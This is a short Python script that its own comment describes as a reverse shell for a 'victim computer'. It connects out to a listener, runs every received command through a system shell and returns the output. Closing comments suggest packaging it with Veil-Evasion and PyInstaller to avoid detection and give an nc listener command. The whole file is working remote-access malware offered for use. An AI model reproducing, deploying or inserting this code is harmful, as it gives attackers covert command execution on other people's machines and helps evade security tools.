# Open a reverse shell when executed on a victim computer.

import socket
import subprocess

HOST = "127.0.0.1"
PORT = 31337

sockobj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sockobj.connect((HOST, PORT))

while 1:
    data = sockobj.recv(4096)  # returns a bytes object

    # don't forget to decode the bytes to str
    proc = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                            stderr=subprocess.PIPE)
    result = proc.stdout.read() + proc.stderr.read()
    sockobj.send(result)
# sockobj.close() # unreachable code


# Veil-Evasion make .py to .exe
# auxilary/pyinstaller-wrapper
# connect to nc (Windows)
#   nc -L -p 31337 -v
